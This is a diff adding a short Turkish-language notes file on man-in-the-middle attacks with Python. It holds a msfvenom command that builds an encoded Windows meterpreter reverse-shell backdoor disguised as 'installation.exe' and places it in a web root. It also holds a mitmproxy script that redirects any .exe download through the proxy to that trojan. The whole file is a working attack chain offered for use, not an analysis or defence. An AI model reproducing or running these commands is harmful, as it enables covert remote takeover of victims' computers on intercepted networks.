@@ -1,0 +1,23 @@
+Python ile Mitm Saldırrıları
+
+##Back Door oluşturmak
+msfvenom -l encoders  //oluşturduğumuz backdoorları şifreleme olanağı sağlar.
+
+
+
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=192.168.1.103 LPORT=1234 -f exe > /var/www/html/installation.exe   //x86/shikata_ga_nai encoderını msfvenom -l encoders olarak yazdığım yerden aldım.
+
+
+
+
+import mitmproxy
+
+def request(flow):
+	if flow.request.host != "192.168.1.103" and flow.request.pretty_url.endswith(".exe"):
+		flow.response = mitmproxy.http.Response.make(301, "", {"Location" : "http://192.168.1.103/installation.exe"})
+		
+
+#def response(flow):
+#	print("response....")
+#	print(flow)
+
